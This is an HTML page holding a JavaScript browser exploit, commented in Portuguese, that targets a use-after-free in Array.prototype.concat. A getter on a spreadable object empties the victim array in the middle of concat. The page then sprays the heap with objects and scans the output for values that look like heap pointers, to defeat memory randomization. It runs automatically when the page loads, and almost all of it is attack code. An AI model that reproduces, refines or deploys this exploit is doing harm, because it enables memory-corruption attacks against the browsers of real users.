<!DOCTYPE html>
<html>
<head>
    <title>Concat UAF: Stale Memory Hunter</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; min-height: 300px; white-space: pre-wrap; }
        .win { color: #0f0; font-weight: bold; font-size: 1.3em; border: 1px solid #0f0; padding: 5px; }
        .fail { color: #555; }
        .info { color: #0ff; }
    </style>
</head>
<body>
    <h2>Concat UAF: Caçando VTable</h2>
    <p>Tentando substituir memória morta por um Objeto para vazar o ponteiro.</p>
    <div id="log">Iniciando...</div>

    <script>
        function log(msg, type='') {
            const el = document.getElementById('log');
            el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // Helpers de Conversão
        const buf = new ArrayBuffer(8);
        const f64 = new Float64Array(buf);
        const u32 = new Uint32Array(buf);

        function d2h(val) {
            f64[0] = val;
            let lo = u32[0];
            let hi = u32[1];
            return `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
        }

        // Variáveis Globais
        var spray = [];
        var targetArray = [];

        function runExploit() {
            try {
                log("1. Configurando Spray de Memória...", 'info');

                // Prepara objetos para ocupar o espaço liberado
                // Usamos objetos com propriedades inline para ter estrutura previsível
                for(let i=0; i<5000; i++) {
                    spray.push({a: 1, b: 2, c: 3, d: 4});
                }

                // O Array que será esvaziado (Vítima)
                // Usamos Floats para alinhar com Double pointers
                targetArray = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

                // O Gatilho
                let hole = {
                    length: 20, // Dizemos que vamos ler 20 itens (OOB)
                    [Symbol.isConcatSpreadable]: true,
                    get 0() {
                        // O MOMENTO CRÍTICO
                        log("   -> Gatilho ativado! Esvaziando array...", 'info');
                        
                        // 1. Libera a memória do targetArray
                        targetArray.length = 0; 
                        
                        // 2. Tenta preencher o vácuo IMEDIATAMENTE com objetos
                        // Criamos milhares de objetos novos na esperança de que um caia
                        // exatamente onde o targetArray estava.
                        let fill = [];
                        for(let k=0; k<10000; k++) {
                            fill.push({p: 1337}); // Objeto simples
                        }
                        
                        // Guarda referência para não ser coletado
                        spray.push(fill);

                        return 100.0; // Marcador
                    }
                };

                log("2. Disparando concat()...");
                
                // Executa a vulnerabilidade
                let res = targetArray.concat(hole);

                log("3. Analisando vazamentos...", 'info');
                
                let found = false;
                for(let i=0; i<res.length; i++) {
                    let val = res[i];
                    
                    // Ignora undefined e nossos marcadores
                    if (val === undefined) continue;
                    if (val === 100.0) continue;
                    
                    // Se acharmos algo que NÃO é 1.1, 2.2... (os originais)
                    // E que parece um ponteiro...
                    let hex = d2h(val);
                    
                    // Ponteiros Userland (Heap)
                    if (hex.startsWith("0x0000")) {
                         if (val < 1000 && val > -1000) continue; // Ignora floats pequenos residuais

                         log(`[!!!] LEAK CANDIDATE [Index ${i}]: ${hex}`, 'win');
                         log(`      Valor Float: ${val}`, 'win');
                         found = true;
                    }
                }

                if (!found) {
                    log("[-] Falha: Leu apenas undefined ou valores limpos.", 'fail');
                    log("    Tente rodar novamente. Feng Shui é questão de sorte.", 'info');
                }

            } catch(e) {
                log("Erro Fatal: " + e.message, 'fail');
            }
        }

        setTimeout(runExploit, 1000);
    </script>
</body>
</html>
